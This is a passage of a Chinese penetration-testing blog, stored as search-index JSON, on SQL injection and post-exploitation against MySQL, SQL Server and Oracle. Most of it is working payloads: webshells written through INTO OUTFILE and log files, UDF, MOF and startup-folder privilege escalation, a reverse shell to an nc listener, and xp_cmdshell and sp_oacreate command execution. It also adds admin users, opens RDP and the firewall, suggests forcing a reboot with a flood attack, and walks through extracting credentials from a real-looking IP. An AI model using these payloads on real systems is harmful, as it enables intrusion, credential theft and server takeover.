","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:9:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件操作 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:10:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"读文件 读文件前提： 1、用户权限足够高，尽量具有root权限。 2、secure_file_priv不为NULL load_file() insert into read2_tb(word) values (load_file('D:/test.txt')); # load_file( )函数支持网络路径。如果你可以将DLL复制到网络共享中，那么你就可以直接加载并将它写入磁盘。 select load_file('\\\\\\\\192.168.0.19\\\\network\\\\lib_mysqludf_sys_64.dll') into dumpfile \"D:\\\\MySQL\\\\mysql-5.7.21-winx64\\\\mysql-5.7.21-winx64\\\\lib\\\\plugin\\\\udf.dll\"; load data infile load data infile 'D:/test.txt' into table read2_tb; ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:10:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"写文件 into outfile select * from read2_tb where 1=1 into outfile 'D:/test2.txt'; # 写webshell id =-1 union select 1,'\u003c?php phpinfo();?\u003e',3,4 into outfile 'c:\\\\1.php' into dumpfile ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:10:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"突破secure-file-priv(通过数据库日志写shell) 5.5.53之前版本，默认情况下此变量（secure-file-priv）为空，允许使用mysql终端对secure_file_priv参数更新（不讨论windows环境安装情况）。 5.5.53及之后版本修改secure_file_priv值只能修改my.cnf配置文件（不讨论windows环境安装)。 load_file: secure_file_priv: into outfile: 方法一：general_log 1.查看secure_file_priv值 show global variables like '%secure_file_priv%'; # show global variables like '%secure%'; # 此开关默认为NULL，即不允许导入导出 # 没有具体值时，表示不对mysqld 的导入|导出做限制 # 值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 2.查询操作日志存放路径 show variables like 'general_log%'; # 操作日志默认也是关闭的 3.首先打开操作日志记录 set global general_log = 'ON'; 4.设置操作记录日志路径 # set global general_log_file='路径地址'; # 选择网站的目录里面 set global general_log_file='D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\xx.php' 5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了 select '\u003c?php @eval($_POST[1]);?\u003e'; 6.切记关闭 set global general_log = 'off'; 7.访问webshell，后续操作 方法二：slow_query_log 慢查询日志，用来记录在MySQL中响应时间超过阀值的语句。开启之后默认阀值是10s，可以更改此时间。 set global slow_query_log=on; set global slow_query_log_file=\"c:\\\\phpStudy\\\\PHPTutorial\\\\wWwW\\\\3.php\" select sleep(15), '\u003c?php assert($_POST[ \"cmd\"]);?\u003e' set global slow_query_log=off ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:10:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"权限提升 常见密码获取方式： ● 读取网站数据库配置文件（了解其命名规则及查找技巧） sql, data, inc, config, conn, database, common, include等 ● 读取数据库存储或备份文件（了解其数据库存储格式及对应内容） 位置：@@basedir/data/数据库名/表名.myd # 先得到数据库安装目录 select @@basedir; # mysql/user.myd是用户表，存储了用户的账号密码 # myd后缀的是数据表 xiaodi数据库名下的user信息 怎么写 mysql/data/xiaodi/user.myd 可以下载它之后然后进行还原 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"1.UDF导出提权(重点) # 利用自定义执行函数导出dll文件进行命令执行 select version(); select user(); # 获取数据库用户 select @@basedir; # 安装目录 show variables like '%plugins%'; # 寻找mysql安装路径 # 手工创建或利用NTFS流创建 plugin目录(如下) select 'x' into dumpfile '......mysql/lib/plugin::INDEX_ALLOCATION'; # Note： 1.mysql\u003c5.1 一般导出dll到目录c:/windows/system32 2.mysql=\u003e5.1 导出安装目录的/lib/plugin/ # 默认不存在，需要创建 # 1.使用脚本(最下面资源MySQL.php)进行自定义函数导出为dll就行(可能会失败) # 2.创建一个自定义函数与dll文件对应 create function cmdshell returns string soname 'moonudf.dll' # 创建叫cmdshell的函数 # 3.执行命令 select cmdshell('命令') # 就可以执行命令了 # 4.添加账户密码，后续操作 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"2.MOF加载提权 系统目录中的mof/目录下有mof文件，目录下面的文件会被系统调用执行。 # 将mof上传至任意可读可写目录下 # 导出自定义mof文件到系统目录加载 c:/windows/system32/wbem/mof/ # 然后使用sql语句将系统当中默认的nullevt.mof给替换为我们自定义恶意的mof文件。进而让系统执行我们这个恶意的mof文件 # 替换的sql语句：select load_file('D:\\WWW\\xx.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"3.启动项重启提权 # 启动项文件夹(开机或重启之后会自动加载的程序) C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp #导出自定义bat或vbs到启动目录配合重启执行 将创建好的adduser.vbs或.bat文件(内容如下)进行服务器启动项写入，配合重启执行！ @echo off net user xiaodi 123!@jqazQ /add # 配合其他利用命令 # 怎么让服务器重启呢？ 可以CC攻击流量过高, 对方服务器打不开时候，然后就会自动重启了 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"4.反弹SHELL提权(重点) 用于UDF没有成功取得cmdshell和MOF提权都失败的情况(对方把一些拓展/配置禁用了) #采用MYSQL反弹函数获取权限，不再调用命令执行类函数! select backshell(ip, 端口) # 然后在自己机器上nc监听 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:4","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"5.sqlmap提权 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:5","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"6.利用msf提权 SQL Server注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:11:6","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简介 权限分析： sa (最高权限，所有操作都可以做) db （拥有者权限， 多个数据操作） public （单个数据操作[可能只有某个数据库甚至没权限]） 注释： -- comment goes here /* comment goes here */ 常用查询： # 查看用户 SELECT CURRENT_USER SELECT user_name(); SELECT system_user; SELECT user; # 数据库版本 SELECT @@version # 数据库名 SELECT DB_NAME() #列数据库 SELECT name FROM master..sysdatabases; SELECT DB_NAME(N); — for N = 0, 1, 2, … SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want =\u003e master, tempdb, model, msdb (Only works in MSSQL 2017+) # 列表 SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’; SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable SELECT table_catalog, table_name FROM information_schema.columns SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want =\u003e trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options (Only works in MSSQL 2017+) # 列列 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable SELECT table_catalog, column_name FROM information_schema.columns # 提取用户名密码 #MSSQL 2000: SELECT name, password FROM master..sysxlogins SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.) #MSSQL 2005 SELECT name, password_hash FROM master.sys.sql_logins SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins # 堆叠注入 ProductID=1; DROP members-- 实验： http://219.153.49.228:40603/new_list.asp?id=2 and 1=1 #页面返回正常说明存在注入点。 # 第二步：查找列数 http://219.153.49.228:40603/new_list.asp?id=2 order by 1 # 成功 ；order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。 # 第三步：查找回显点 http://219.153.49.228:40603/new_list.asp?id=2 and 1=2 union all select null,null,null,null；# 挨个替换null 发现 select null,2,null,null 页面出现回显。 # 第四步：查找所在库名称添加： ?id=2 and 1=2 union all select 1,(select db_name()), '3', 4 #找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据库 # 第五步：查找数据库表名称： ?id=2 and 1=2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = 'U'),'3',4 # 提示: xtype='U'为用户表 # 第六步：查找列名称： ?id=2 and 1=2 union all select 1,(select top 1 col_name(object_id('manage'),1) from sysobjects),'3',4 #替换 col_name(object_id('manage'),1) 中的1 依次为 2，3，4查出所有列名。 # 第七步：查取数据: ?id=2 and 1=2 union all select 1,(select top 1 username from manage),'3',4 # 获取用户名 ?id=2 and 1=2 union all select 1,(select top 1 password from manage),'3',4 # 获取密码 # 第八步：MD5 解密 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:12:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"注入流程 判断是否为mssql数据库： and (select count(*) from sysobjects) \u003e0 注入流程： # 0.1判断注入 and 1=1 and 1=2 # 0.2回显，判断数据库类型 And 1=2 # 0.3判断字段 order by ... # 1.判断字段数量和类型 union all select null,null,null,null union all select '1','2','3','4' union all select '1','2',db_name(),'4' # 2.联合查询 And 1=2 Union select …… And 1=2 union all select …… #注：判断字符是否特殊 And 1=2 union all select 1,2,’3’,4 # 2.1 猜数据库名 And 1 =2 union all select 1,db_name(),3,4 And 1 =2 union all select 1,db_name(1),3,4 And 1 =2 union all select 1,db_name(2),3,4 And 1 =2 union all select 1,db_name(3),3,4 …… # 3.猜表名 And 1=2 union all select 1,(select top 1 name from 数据库名.dbo.sysobjects where xtype=’u’),3,4 #3.1查看其它表名： And 1=2 union all select 1,(select top 1 name from 数据库名.dbo.sysobjects where xtype=’u’ and name not in (‘表名’)),3,4 #实例： union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),'3',4 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),'3',4 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage','announcement')),'3',4 # 3.查列名 union all select 1,(select top 1 col_name(object_id('manage'),1)from sysobjects),'3',4 union all select 1,(select top 1 col_name(object_id('manage'),2)from sysobjects),'3',4 union all select 1,(select top 1 col_name(object_id('manage'),3)from sysobjects),'3',4 #例子： id=-2 union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null id=-2 union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null id=-2 union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null #以上几步说明mange表总共有3列，分别为：id、username、password # 4.爆破值 union all select null,username, password ,null from manage 判断字段长度和值: #判断username长度和值 # 长度 len() and exists (select id from manage where len(username)\u003c20 and id=1) and exists (select id from manage where len(username)\u003c15 and id=1) and exists (select id from manage where len(username)=8 and id=1) # 值 unicode() and exists (select id from manage where unicode(substring(username,2,1)) = 100 and id=1) ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:13:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"联合注入 ?id=-1' union select null,null-- ?id=-1' union select @@servername, @@version-- ?id=-1' union select db_name(),suser_sname()-- ?id=-1' union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null-- ?id=-1' union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null-- ?id--1' union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null-- ?id=-1' union select (select top 1 column name from information_schema.columns where table_name='users' and column_name not in (select top 1 column_name from information_schema.columns where table_name = 'users')),null--- ?id=-1' union select (select top 1 username from users where username not in (select top 3 username from users)),null-- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:14:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"报错注入 # 对于整数型 convert(int,@@version) cast((SELECT @@version) as int) # 对于字符型 ' + convert(int,@@version) + ' ' + cast((SELECT @@version) as int) + ' ?id=1' and 1=(select 1/@@servername)-- ?id=1' and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))-- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:15:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"盲注 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:16:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"布尔盲注 ?id=1' and ascii(substring((select db_ name(1)),1,1))\u003e 64-- AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- - AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))\u003e64-- AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)\u003e90 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%' WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:16:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"时间盲注 使用延时函数：WAITFOR DELAY # 语法: WAITFOR DELAY '0:0:n' #表⽰延迟4秒 WAITFOR DELAY '0:0:4' -- # IF exists ()⼦句 IF exists () WAITFOR DELAY '0:0:5' ?id= 1';if(2\u003e1) waitfor delay '0:0:5'-- ?id= 1';if(ASCII(SUBSTRING((select db_name(1)),1,1))\u003e 64) waitfor delay ProductID=1;waitfor delay '0:0:10'-- ProductID=1);waitfor delay '0:0:10'-- ProductID=1';waitfor delay '0:0:10'-- ProductID=1');waitfor delay '0:0:10'-- ProductID=1));waitfor delay '0:0:10'-- IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]' comment: -- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:16:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件操作 判断文件是否存在 exec xp_fileexist \"C:\\\\users\\\\public\\\\test.txt\" 返回0表示文件不存在，1表示存在。 #在执行无回显命令时，把执行结果重定向到一个文件，再用xp_fileexist判断该文件是否存在，就可知道命令是否执行成功。 列目录 exec xp_subdirs \"C:users\\\\Administrator\\\\\",2,1 第一个参数设定要查看的文件夹。 第二个参数限制了这个存储过程将会进行的递归级数，默认是0或所有级别。 第三个参数告诉存储过程包括文件。默认是0或只对文件件，数值1代表结果集的文件 读取文件 -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null 写文件 exec sp_makewebtask 'c:\\www\\testwr.asp',' select' '\u003c%execute(request(\"SB\"))%\u003e'' 需要开启Web Assistant Procedures exec sp_configure 'web Assistant Procedures'，1; RECONFIGURE 在sql server 2012上开启失败。 创建目录 exec xp_create_subdir 'D:\\test' 压缩文件 exec xp_makecab 'c:test.cab','mszip'，1, 'c:test.txt' , 'c:test1.txt' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:17:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"信息获取 获取机器名 exec xp getnetname 获取系统信息 exec xp_msver 获取驱动器信息 exec xp_fixeddrives 获取域名 SELECT DEFAULT_DOMAIN( ) as mydomain; 遍历域用户 先获取RID SELECT SUSER_SID('CATE4CAFE\\Domain Admins') 采用循环SQL语句遍历即可遍历出所有域用户。 #或者使用 https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1 msf有个模块可以通过注入点枚举域用户 use auxiliary admin mssql/mssql_enum_domain_accounts_sali ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:18:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"命令执行\u0026提权 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:19:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"xp_cmdshell xp_cmdshell(SQLServer 2005之后默认禁用) # 启用xp_cmdshell： use master; EXEC sp_configure 'show advanced options', 1 RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; #执行命令 EXEC xp_cmdshell \"net user\"; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'; EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'; # 关闭xp_cmdshell： exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 0; reconfigure; # 执行whoami 查看得到的权限是(如果是高权限就..., 如果是network service 权限--\u003e就想别的办法) # 如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复(xplog70.dll可以自己本地安装然后复制出来) exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\xplog70.dll' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:19:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"sp_oacreate ## 启用： EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; # 关闭： EXEC sp_configure 'show advanced options', 0; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE WITH OVERRIDE; ## 执行： # 这个也可以上传一个木马 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami \u003ec:\\\\1.txt' # 针对无回显，就可以输出到txt文件：把系统命令执行结果输出到1.txt #以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:19:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SQL Server CLR CLR有点繁琐，参考文章：https://www.cnblogs.com/wh4am1/p/11669539.html ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:19:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SQL Server 沙盒 exec sp_configure 'show advanced options',1;reconfigure; -- 不开启的话在执行xp_regwrite会提示让我们开启， exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure; -- 关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0; -- 查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。 exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines', 'SandBoxMode' -- 执行系统命令 select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\"net user test test /add\")') select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell(\"net localgroup administrators test /add\")') 沙盒模式SandBoxMode参数含义（默认是2） `0`：在任何所有者中禁止启用安全模式 `1` ：为仅在允许范围内 `2` ：必须在access模式下 `3`：完全开启 openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。 -- 恢复配置 -- exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1; -- exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure; -- exec sp_configure 'show advanced options',0;reconfigure; sql server常用操作远程桌面语句: # 1.查看是否开启远程桌面,1表示关闭,0表示开启 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections' # 2.读取远程桌面端口 EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp','PortNumber' # 3.开启远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',0; #reg文件开启远程桌面: Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]\"fDenyTSConnections\"=dword:00000000[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]\"PortNumber\"=dword:00000d3d #保存micropoor.reg,并执行regedit /s micropoor.reg #注:如果第一次开启远程桌面,部分需要配置防火墙规则允许远程端口。 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow # 4.关闭远程桌面 EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',1; OracleSQL注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:19:4","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"注入流程 #1.判断数据库为oracle 提交注释字符/*，返回正常即是MySQL，否则继续提交注释符号--，该符号是Oracle和MSSQL支持的注释符，返回正常就需要继续判断。 可以继续提交多语句支持符号; 如果支持多行查询，说明是MSSQL，因为Oracle不支持多行查询，可以继续提交查询语句： #oracle：独有的虚拟表 dual： (select count(*) from dual)\u003c\u003e0 #2.order by 定字段 #Union联合查询： #3.一个一个去判断字段类型 union select null,null from dual #确定是str型的 id=-1%20union%20select%20%27a%27,%27null%27%20from%20dual #4.数据库 union%20select%20(select%20instance_name%20from%20v$instance),%272%27%20from%20dual #5.爆数据表 union select (select table_name from all_tables where rownum=1 and table_name like '%user%'),'2' from dual #6.爆字段名 第一个字段 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual 第二个字段 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name \u003c\u003e 'user_name') from dual #7.爆数据 #爆某表中的第一行数据： union select 1,字段1||字段2...||字段n from 表名 where rownum=1 -- 第一个 union select user_name,user_pwd from \"sns_users\" 第二个 union select user_name,user_pwd from \"sns_users\" where user_name \u003c\u003e 'hu' ------ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:20:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常用查询 # 查看数据库版本 SELECT user FROM dual UNION SELECT * FROM v$version # 查看当前用户： SELECT user FROM dual; # 列出所有用户： SELECT username FROM all_users ORDER BY username; # 列出数据库 SELECT DISTINCT owner FROM all_tables; # 列出表名： SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables; SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%'; # 列出字段名： SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’; SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’; # 定位DB文件： SELECT name FROM V$DATAFILE; ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:21:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"联合注入 ?id=-1' union select user,null from dual-- ?id=-1' union select version,null from v$instance-- ?id=-1' union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)-- ?id=-1' union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=2)-- ?id=-1' union select username,passwd from users-- ?id=-1' union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)-- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:22:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"报错注入 ?id=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))-- ?id=1' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like 'Oracle%))-- ?id=1' and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))-- ?id=1' and 